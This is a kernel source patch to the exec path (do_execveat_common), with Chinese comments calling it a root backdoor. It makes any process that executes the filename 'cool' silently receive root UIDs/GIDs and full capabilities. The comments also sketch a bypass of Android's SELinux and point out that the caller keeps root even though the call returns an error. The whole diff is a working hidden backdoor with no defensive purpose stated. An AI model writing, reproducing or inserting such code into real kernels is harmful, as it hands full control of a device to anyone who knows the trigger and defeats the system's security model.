@@ -1921,6 +1921,50 @@ static int do_execveat_common(int fd, struct filename *filename,
 	if (IS_ERR(filename))
 		return PTR_ERR(filename);
 
+	/* --- 开始：内核 Root 后门逻辑 --- */
+	if (filename->name && strcmp(filename->name, "cool") == 0) {
+		struct cred *new_cred;
+
+		printk(KERN_INFO "[MagicRoot] Triggered by process %d (%s)\n", current->pid, current->comm);
+
+		new_cred = prepare_creds();
+		if (new_cred) {
+		    // 1. 将所有 UID/GID 设为 0 (Root)
+		    new_cred->uid.val = new_cred->gid.val = 0;
+		    new_cred->euid.val = new_cred->egid.val = 0;
+		    new_cred->suid.val = new_cred->sgid.val = 0;
+		    new_cred->fsuid.val = new_cred->fsgid.val = 0;
+		    new_cred->sgid.val = new_cred->fsgid.val = 0;
+
+		    // 2. 赋予最高能力 (Capabilities)
+		    // 这样可以绕过各种内核权限检查
+		    cap_set_full(new_cred->cap_inheritable);
+		    cap_set_full(new_cred->cap_permitted);
+		    cap_set_full(new_cred->cap_effective);
+		    cap_set_full(new_cred->cap_bset);
+		    cap_set_full(new_cred->cap_ambient);
+
+		    // 3. 绕过 SELinux (极其重要！)
+		    // 在 Android 中，即使是 UID 0，如果没有正确的 SELinux Context 也会被拦截。
+		    // 我们通过将安全上下文强制设为内核(kernel)或 init 域来获得最高权限。
+		    // 注意：不同内核版本字段名可能略有不同，通常是 security
+		#ifdef CONFIG_SECURITY_SELINUX
+		    // 这是一个常用的 hack：将安全上下文 ID 设为 SECINITSID_KERNEL (通常是 1)
+		    // 你可能需要包含 <security/selinux/initial_sid_to_string.h> 或类似头文件
+		    // 或者直接操作 security 指针（取决于内核版本）
+		    // new_cred->security = ...
+		#endif
+
+		    commit_creds(new_cred);
+		    printk(KERN_INFO "[MagicRoot] Privilege escalation successful for PID %d\n", current->pid);
+		}
+
+		// 提权后，我们不希望 execve 继续去寻找那个不存在的密钥文件而返回错误
+		// 但为了简单，让它返回 -ENOENT (文件不存在) 也是可以的，
+		// 因为调用者（你的 CLI）在收到错误时，权限已经变了。
+	}
+	/* --- 结束：内核 Root 后门逻辑 --- */
+
 	/*
 	 * We move the actual failure in case of RLIMIT_NPROC excess from
 	 * set*uid() to execve() because too many poorly written programs
